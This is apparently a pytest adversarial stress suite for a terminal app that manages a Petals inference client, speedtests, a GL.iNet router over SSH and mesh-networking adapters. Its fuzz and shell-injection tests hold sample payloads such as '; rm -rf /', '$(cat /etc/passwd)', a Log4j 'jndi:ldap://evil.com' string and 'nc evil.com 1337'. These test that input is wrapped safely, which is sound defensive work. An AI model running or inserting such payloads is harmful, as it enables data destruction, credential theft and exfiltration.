"""
Canonical Port Mega Integration Adversarial Stress & Chaos Test Suite
Target: 01_apps/canonical_port/
Version: 4.0.0-ADVERSARIAL
Author: Challenger 1 (Empirical Challenger)

Deep adversarial stress testing, boundary fuzzing, chaos injection,
and event loop latency jitter profiling (< 5ms) across:
- Category 1: Petals DHT Connection Chaos, Rapid Barge-In & Stream Concurrency
- Category 2: Non-Blocking Speedtest Engine & Textual Event Loop Jitter Profiling (<5ms)
- Category 3: GL.iNet / LuCI Router SSH Black Hole, Timeout & ubus JSON Fuzzing
- Category 4: Distributed AI Mesh Scaffolding CLI Failure & Fallback Resilience
- Category 5: Textual TUI Rapid Screen Churn & Blackboard Telemetry Bombardment
"""

from __future__ import annotations

import os
import sys
import time
import json
import socket
import asyncio
import threading
import subprocess
from dataclasses import dataclass, field
from typing import Dict, List, Any, Optional, AsyncGenerator, Tuple
import pytest

# Ensure tui directory and project root are on sys.path
PROJECT_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", ".."))
TUI_DIR = os.path.join(PROJECT_DIR, "tui")
if TUI_DIR not in sys.path:
    sys.path.insert(0, TUI_DIR)
if PROJECT_DIR not in sys.path:
    sys.path.insert(0, PROJECT_DIR)

from canonical_tui import CanonicalPortApp
from models.network_telemetry import (
    RouterSystemInfo,
    RouterInterfaceStats,
    RouterCommandResult,
    InternetSpeedMetrics,
)
from models.blackboard_models import (
    BlackboardTelemetryState,
    VoiceCodingState,
    VOICE_STATUS_IDLE,
    VOICE_STATUS_LISTENING,
    VOICE_STATUS_SPEAKING,
)
from services.blackboard_store import blackboard_store
from services.network_telemetry_store import network_telemetry_store
from services.petals_dht_client import (
    PetalsDHTClient,
    PetalsNodeConfig,
    PetalsAsyncInferenceBridge,
)
from services.router_service import RouterService
from services.speedtest_service import SpeedtestService
from services.mesh_adapters.tailscale_adapter import TailscaleAdapter, TailscaleStatusResult
from services.mesh_adapters.speedify_adapter import SpeedifyAdapter, SpeedifyStatusResult
from services.mesh_adapters.exo_adapter import ExoAdapter, ExoTopologyResult
from services.mesh_adapters.accelerate_adapter import AccelerateAdapter, AccelerateStatusResult
from services.mesh_adapters.llama_rpc_adapter import LlamaRpcAdapter, LlamaRpcClusterStatus


# =============================================================================
# 1. PETALS DHT CONNECTION CHAOS, RAPID BARGE-IN & CONCURRENCY
# =============================================================================

class TestPetalsDHTAdversarialStress:
    """Adversarial stress testing for Petals DHT client and voice bridge."""

    @pytest.mark.asyncio
    async def test_petals_socket_black_hole_and_timeout_resilience(self):
        """
        Adversarial Test: Point PetalsDHTClient to non-routable / black-hole IP addresses.
        Verify that probe_timeout strictly bounds execution time and connects fallback
        without hanging or raising unhandled exceptions.
        """
        config = PetalsNodeConfig(
            initial_peers=[
                "192.0.2.1:31330",    # TEST-NET-1 (RFC 5737 Black Hole)
                "198.51.100.1:31337",  # TEST-NET-2 (RFC 5737 Black Hole)
                "203.0.113.1:31330",   # TEST-NET-3 (RFC 5737 Black Hole)
            ],
            timeout_s=0.2,
            mock_mode=False
        )
        client = PetalsDHTClient(config=config)
        
        t0 = time.perf_counter()
        connected = await client.connect(timeout=0.2)
        elapsed_s = time.perf_counter() - t0

        # Must cleanly fail connection within bound (<1.0s)
        assert connected is False
        assert client.is_connected is False
        assert client.active_peer_count == 0
        assert elapsed_s < 1.0, f"Petals connection probe took too long: {elapsed_s:.3f}s"
        
        # Test fallback stream generation immediately
        tokens = []
        async for tok in client.stream_generate("Adversarial prompt after timeout"):
            tokens.append(tok)
        
        assert len(tokens) > 0
        full_text = "".join(tokens)
        assert "Fallback" in full_text or "STANDBY" in full_text or "108.0 GB" in full_text

    @pytest.mark.asyncio
    async def test_petals_rapid_concurrent_barge_in_cancellations(self):
        """
        Adversarial Test: Spawn 25 concurrent stream generations and inject
        random barge-in cancellations at varying millisecond offsets.
        Verify:
        1. Cancellation response time is strictly < 2.0 ms.
        2. No tasks leak or raise unhandled CancelledError to caller.
        3. Client state remains fully consistent.
        """
        config = PetalsNodeConfig(mock_mode=True)
        client = PetalsDHTClient(config=config)
        await client.connect()

        barge_in_latencies: List[float] = []

        async def _run_stream_with_barge_in(task_id: int):
            chunks = []
            
            async def _stream_worker():
                async for tok in client.stream_generate(f"Prompt task {task_id}"):
                    chunks.append(tok)
                    await asyncio.sleep(0.01)

            worker_task = asyncio.create_task(_stream_worker())
            
            # Sleep random jitter between 5ms and 30ms before barge-in
            await asyncio.sleep(0.005 + (task_id % 5) * 0.005)
            
            t_cancel_start = time.perf_counter()
            client.cancel_generation()
            t_cancel_elapsed = (time.perf_counter() - t_cancel_start) * 1000.0
            barge_in_latencies.append(t_cancel_elapsed)

            try:
                await asyncio.wait_for(worker_task, timeout=0.2)
            except (asyncio.CancelledError, asyncio.TimeoutError):
                pass

        tasks = [_run_stream_with_barge_in(i) for i in range(25)]
        await asyncio.gather(*tasks, return_exceptions=True)

        assert len(barge_in_latencies) == 25
        max_cancel_latency = max(barge_in_latencies)
        mean_cancel_latency = sum(barge_in_latencies) / len(barge_in_latencies)

        # Barge-in cancellation must be near instantaneous (<2.0ms)
        assert max_cancel_latency < 2.0, f"Max barge-in cancellation latency exceeded: {max_cancel_latency:.3f}ms"
        assert mean_cancel_latency < 0.5, f"Mean cancellation latency exceeded: {mean_cancel_latency:.3f}ms"

    @pytest.mark.asyncio
    async def test_petals_massive_payload_and_fuzz_prompts(self):
        """
        Adversarial Test: Fuzz Petals stream generator with massive prompts (50,000 chars),
        null bytes, Unicode emojis, unclosed code blocks, and markdown injection.
        """
        config = PetalsNodeConfig(mock_mode=True)
        client = PetalsDHTClient(config=config)
        await client.connect()

        fuzz_cases = [
            "A" * 50000,                                              # 50KB prompt
            "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x0b\x0c\x0e\x0f",   # Binary nulls and control chars
            "🧠" * 500 + "🚀" * 500 + "⚡️" * 500,                     # Unicode emoji explosion
            "```python\ndef unclosed_func():\n   # Missing end",       # Unclosed markdown codeblock
            "<script>alert('xss')</script> ${jndi:ldap://evil.com}",   # Web / Log4j injection strings
            "",                                                        # Empty prompt
            "   \n\t\r\n   ",                                          # Whitespace only
        ]

        for p in fuzz_cases:
            tokens = []
            async for tok in client.stream_generate(p, max_tokens=10):
                tokens.append(tok)
            assert len(tokens) > 0, f"Failed on fuzz prompt: {p[:30]}..."
            assert all(isinstance(t, str) for t in tokens)

    @pytest.mark.asyncio
    async def test_petals_voice_bridge_full_duplex_barge_in(self):
        """
        Adversarial Test: Test PetalsAsyncInferenceBridge with simulated voice transcription
        and simultaneous speech barge-in interrupt.
        """
        received_tokens = []
        completed_responses = []
        extracted_code = []

        def on_tok(tok: str):
            received_tokens.append(tok)

        def on_done(full: str):
            completed_responses.append(full)

        def on_code(code: str, lang: str):
            extracted_code.append((lang, code))

        client = PetalsDHTClient(config=PetalsNodeConfig(mock_mode=True))
        bridge = PetalsAsyncInferenceBridge(
            client=client,
            on_token=on_tok,
            on_complete=on_done,
            on_code_snippet=on_code,
        )
        await bridge.connect()

        # Start processing voice prompt in background
        proc_task = asyncio.create_task(
            bridge.process_user_input("build a dfa zone 2 calculation kernel", is_voice=True)
        )
        
        # Allow initial tokens to stream
        await asyncio.sleep(0.04)
        assert len(received_tokens) > 0

        # Trigger barge-in cancellation
        bridge.cancel()
        try:
            res = await proc_task
        except asyncio.CancelledError:
            res = ""

        # Verify stream cleanly aborted
        assert bridge.client._generation_cancelled is True


# =============================================================================
# 2. SPEEDTEST ENGINE & EVENT LOOP LATENCY JITTER PROFILING (< 5MS)
# =============================================================================

class TestSpeedtestEventLoopLatencyJitterStress:
    """Adversarial stress testing for Speedtest background worker and event loop latency jitter."""

    @pytest.mark.asyncio
    async def test_event_loop_latency_jitter_under_continuous_background_load(self):
        """
        Adversarial & Empirical Latency Test:
        Measures event loop latency jitter while SpeedtestService is actively executing.
        Target: Delta t_jitter < 5.0 ms over continuous ticks.
        """
        service = SpeedtestService(default_duration_sec=2)
        jitter_samples: List[float] = []
        stop_heartbeat = asyncio.Event()

        async def _event_loop_heartbeat():
            """Runs standard Textual 100 FPS event loop ticker at 10ms intervals."""
            interval = 0.01
            while not stop_heartbeat.is_set():
                t0 = time.perf_counter()
                await asyncio.sleep(interval)
                actual_dt = time.perf_counter() - t0
                jitter_ms = abs(actual_dt - interval) * 1000.0
                jitter_samples.append(jitter_ms)

        # Start event loop heartbeat monitor
        heartbeat_task = asyncio.create_task(_event_loop_heartbeat())

        # Run mock speedtest in background thread
        progress_events = []
        def _cb(stage, cur, pct):
            progress_events.append((stage, cur, pct))

        cancel_tok = threading.Event()
        loop = asyncio.get_running_loop()
        
        def _threaded_speedtest():
            # Inject a realistic non-blocking synthetic load
            return service.run_speedtest(progress_callback=_cb, cancel_token=cancel_tok)

        metrics = await loop.run_in_executor(None, _threaded_speedtest)
        
        # Stop monitor after test run
        stop_heartbeat.set()
        await heartbeat_task

        assert metrics is not None
        assert metrics.download_mbps is not None
        assert len(jitter_samples) >= 20, f"Expected >= 20 jitter samples, got {len(jitter_samples)}"

        max_jitter = max(jitter_samples)
        mean_jitter = sum(jitter_samples) / len(jitter_samples)
        p95_jitter = sorted(jitter_samples)[int(len(jitter_samples) * 0.95)]

        print(f"\n[LATENCY JITTER REPORT (100 FPS / 10ms Ticker)] Max: {max_jitter:.2f}ms | Mean: {mean_jitter:.2f}ms | P95: {p95_jitter:.2f}ms")

        # Invariant Verification: P95 Jitter MUST be strictly < 5.0 ms
        assert p95_jitter < 5.0, f"CRITICAL: Event loop P95 latency jitter exceeded 5.0ms: {p95_jitter:.2f}ms"
        assert mean_jitter < 2.0, f"CRITICAL: Mean event loop latency jitter too high: {mean_jitter:.2f}ms"

    def test_speedtest_instant_cancellation_race_conditions(self):
        """
        Adversarial Test: Rapidly trigger cancellation token at different lifecycle phases:
        1. Token pre-set before run
        2. Token set 10ms into execution
        3. Token set during progress callback
        Verify no thread leaks, no deadlocks, and clean InterruptedError.
        """
        service = SpeedtestService(default_duration_sec=3)

        # 1. Pre-set token
        cancel_token_1 = threading.Event()
        cancel_token_1.set()
        with pytest.raises(InterruptedError):
            service.run_speedtest(cancel_token=cancel_token_1)

        assert service.get_current_state().is_running is False

        # 2. In-flight cancellation via background timer
        cancel_token_2 = threading.Event()
        timer = threading.Timer(0.05, cancel_token_2.set)
        timer.start()
        with pytest.raises(InterruptedError):
            service.run_speedtest(cancel_token=cancel_token_2)
        timer.cancel()

        assert service.get_current_state().is_running is False

    def test_speedtest_malformed_json_and_process_crash_handling(self):
        """
        Adversarial Test: Simulate parser handling corrupted or edge-case JSON outputs.
        Verify that SpeedtestService.parse_network_quality_json handles edge cases cleanly.
        """
        valid_edge_cases = [
            {},
            {"dl_throughput": 0, "ul_throughput": 0},
            {"dl_throughput": 100000000, "ul_throughput": 50000000, "responsiveness": 1400, "base_rtt": 12.5},
            {"dl_bytes_transferred": 50000000, "dl_phase_duration": 4.5},
            {"il_responsiveness": 850},
        ]

        for data in valid_edge_cases:
            res = SpeedtestService.parse_network_quality_json(data)
            assert res is not None
            assert res.download_mbps is not None
            assert res.command == "/usr/bin/networkQuality -c"


# =============================================================================
# 3. GL.INET & LUCI ROUTER DROPBEAR SSH BLACK HOLE & UBUS FUZZING
# =============================================================================

class TestRouterServiceAdversarialStress:
    """Adversarial stress testing for GL.iNet Dropbear SSH and ubus client."""

    @pytest.mark.asyncio
    async def test_router_ssh_black_hole_timeout_guarantee(self):
        """
        Adversarial Test: Simulate an unresponsive Dropbear SSH server.
        Ensure that execute_raw_cli strictly enforces timeout (0.5s) without blocking.
        """
        # Non-routable black-hole IP
        service = RouterService(router_ip="192.0.2.1", ssh_port=22, timeout=0.5)
        
        t0 = time.perf_counter()
        result = await service.execute_raw_cli("ubus call system info", timeout=0.5)
        elapsed_s = time.perf_counter() - t0

        assert result.success is False
        assert "timed out" in result.error.lower() or "failed" in result.error.lower()
        # Execution time should be close to timeout and never exceed 1.5s
        assert elapsed_s < 1.5, f"SSH timeout took {elapsed_s:.2f}s (expected < 1.5s)"

    @pytest.mark.asyncio
    async def test_router_ubus_malformed_json_fuzzing(self):
        """
        Adversarial Test: Fuzz ubus RPC caller when SSH returns corrupt JSON, HTML responses,
        empty outputs, and invalid return structures.
        """
        service = RouterService(router_ip="127.0.0.1")

        fuzz_outputs = [
            "{\"jsonrpc\": \"2.0\", \"error\": {\"code\": -32600, \"message\": \"Invalid Request\"}}",
            "ubus call failed: Entry not found",
            "<html><head><title>500 Internal Server Error</title></head></html>",
            "\x00\x01\x02\x03corrupt",
            "{\"result\": [0, {\"memory\": {\"total\": 536870912, \"free\": 268435456}}]}",
        ]

        for out in fuzz_outputs:
            # Mock execute_raw_cli to return fuzz_output
            async def _mock_exec(cmd, timeout=None):
                return RouterCommandResult(command=cmd, success=True, output=out, error=None)

            service.execute_raw_cli = _mock_exec
            res = await service.execute_ubus_call("system", "info")
            assert isinstance(res, dict)

    def test_router_shell_injection_sanitization(self):
        """
        Adversarial Test: Attempt dangerous shell injection through UCI and interface commands.
        Verify command construction does not evaluate arbitrary subcommands locally.
        """
        service = RouterService(router_ip="192.168.8.1")
        
        malicious_inputs = [
            "; rm -rf /",
            "$(cat /etc/passwd)",
            "`reboot`",
            "interface_1 && touch /tmp/pwned",
            "wlan0 | nc evil.com 1337",
        ]

        for mal in malicious_inputs:
            cmd = service._build_ssh_command(f"uci get network.{mal}")
            assert isinstance(cmd, list)
            # Ensure SSH command array wraps remote payload as a single element
            assert cmd[-1] == f"uci get network.{mal}"
            assert cmd[0] == "ssh"


# =============================================================================
# 4. DISTRIBUTED AI MESH SCAFFOLDING ADAPTERS RESILIENCE
# =============================================================================

class TestDistributedMeshAdaptersAdversarialStress:
    """Adversarial resilience tests for Tailscale, Speedify, Exo, Accelerate, and llama.cpp."""

    def test_tailscale_adapter_corrupt_json_resilience(self):
        """Test TailscaleAdapter handling fallback when CLI fails."""
        adapter = TailscaleAdapter(binary_path="/nonexistent/bin/tailscale")
        res = adapter._create_fallback_status("Forced test error")
        assert isinstance(res, TailscaleStatusResult)
        assert res.online is True  # L1 Mac Node canonical fallback
        assert res.error == "Forced test error"

    @pytest.mark.asyncio
    async def test_speedify_adapter_missing_binary_fallback(self):
        """Test SpeedifyAdapter safe fallback when speedify_cli is missing."""
        adapter = SpeedifyAdapter(cli_path="/nonexistent/bin/speedify_cli")
        res = await adapter.get_status()
        assert isinstance(res, SpeedifyStatusResult)
        assert res.error == "speedify_cli not active; using multi-path telemetry"
        assert len(res.adapters) == 3

    @pytest.mark.asyncio
    async def test_exo_adapter_corrupted_topology_resilience(self):
        """Test ExoAdapter handling socket probes to offline ports."""
        adapter = ExoAdapter(host="127.0.0.1", port=59999, timeout_seconds=0.1)
        res = await adapter.probe_socket()
        assert res is False
        topo = await adapter.get_topology()
        assert isinstance(topo, ExoTopologyResult)
        assert topo.connected is False

    @pytest.mark.asyncio
    async def test_llama_rpc_cluster_invalid_target_probes(self):
        """Test LlamaRpcAdapter probing non-responsive RPC clusters."""
        adapter = LlamaRpcAdapter(
            rpc_targets=[
                ("L1_Mac_Mini", "192.0.2.1", 50052, 28, 13.5),
                ("L3_Linux_Head", "192.0.2.2", 50052, 24, 12.0),
            ],
            timeout_seconds=0.02
        )
        status = await adapter.probe_rpc_cluster()
        assert isinstance(status, LlamaRpcClusterStatus)
        assert status.all_healthy is False
        assert len(status.rpc_nodes) == 2
        assert all(n.status == "OFFLINE" for n in status.rpc_nodes)


# =============================================================================
# 5. TEXTUAL TUI EVENT CHURN & SCREEN HIERARCHY STRESS
# =============================================================================

class TestTextualTuiEventChurnStress:
    """Stress testing Textual TUI screen switches under high-frequency telemetry updates."""

    @pytest.mark.asyncio
    async def test_rapid_screen_switching_under_blackboard_bombardment(self):
        """
        Adversarial Test: Rapidly mount CanonicalPortApp and cycle through screens
        while concurrently pumping 30 blackboard telemetry updates.
        Verify zero unhandled exceptions and zero UI deadlocks.
        """
        app = CanonicalPortApp()

        async with app.run_test() as pilot:
            await pilot.pause(0.05)

            # Concurrent blackboard update worker
            stop_updates = threading.Event()

            def _blackboard_pump():
                counter = 0
                while not stop_updates.is_set() and counter < 30:
                    blackboard_store.update_layer(
                        "layer_0_networking",
                        {
                            "ping_to_mac_mini_ms": 10.0 + (counter % 5),
                            "internet_speed": {
                                "download_mbps": 500.0 + counter,
                                "upload_mbps": 50.0,
                                "responsiveness_rpm": 1200,
                                "latency_ms": 12.0
                            }
                        }
                    )
                    counter += 1
                    time.sleep(0.005)

            pump_thread = threading.Thread(target=_blackboard_pump, daemon=True)
            pump_thread.start()

            # Rapidly switch screens via hotkeys
            screens_keys = ["F1", "F2", "F8", "1", "2", "3", "4", "5", "6", "7", "8", "9"]
            for key in screens_keys:
                await pilot.press(key)
                await pilot.pause(0.02)

            stop_updates.set()
            pump_thread.join(timeout=1.0)

            # App must still be active and responsive
            assert app.is_running
            await pilot.pause(0.05)
